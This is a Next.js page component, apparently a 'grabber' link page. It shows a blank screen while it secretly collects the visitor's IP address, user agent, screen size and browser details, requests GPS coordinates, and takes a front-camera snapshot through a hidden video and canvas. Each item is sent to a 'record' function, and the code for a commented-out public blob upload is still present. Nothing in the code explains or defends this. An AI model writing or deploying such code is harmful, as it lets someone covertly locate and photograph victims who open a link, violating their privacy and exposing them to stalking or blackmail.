'use client'

import { useEffect, useState, useRef } from "react";
import record from "./record";
import { put } from "@vercel/blob";


export default function Home() {
  const [showJumpScare, setShowJumpScare] = useState(false);

  useEffect(() => {
    // const timer = setTimeout(() => {
    //   setShowJumpScare(true);
    //   // Play the jump scare sound
    //   const audio = new Audio('/sound.mp3');
    //   audio.play();
    // }, 5000); // Jump scare after 5 seconds

    // return () => clearTimeout(timer);
  }, []);


  useEffect(() => {
    (async () => {
      const ip = await (await fetch("https://api.ipify.org/?format=text")).text()
      const additional = {}
      additional["ip"] = ip
      additional["userAgent"] = navigator.userAgent
      additional["screenResolution"] = `${window.innerWidth}x${window.innerHeight}`
      additional["navigator"] = navigator
      record("additional", JSON.stringify(additional))
      console.log(ip)
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
          setTimeout(() => {
            record("gps", JSON.stringify([position.coords.latitude, position.coords.longitude]))
          }, 1000)

        },
          (error) => {
            record("error", JSON.stringify([error]))
          });
      } else {
        record("error", "Geolocation is not supported by this browser.");
      }


    })()

  }, []);
  const accessCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' }
      });

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        setTimeout(async () => {
          const canvas = canvasRef.current;
          canvas.width = videoRef.current.videoWidth;
          canvas.height = videoRef.current.videoHeight;
          canvas.getContext('2d').drawImage(videoRef.current, 0, 0);

          const base64 = canvas.toDataURL("image/png");
          record("img", JSON.stringify({ image: base64 }))
          // alert(base64)
          // console.log(base64)
          // const { url } = await put(Math.random().toString().slice(2,), base64, { access: 'public' });

        }, 1000)
      }
    } catch (error) {
      record("error", "Error accessing the camera: " + error);
    }
  };

  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  useEffect(() => {
    accessCamera();
  }, []);


  return (
    <main className="">
      <video ref={videoRef} autoPlay playsInline hidden />
      <canvas ref={canvasRef} hidden />
    </main>
  );
}
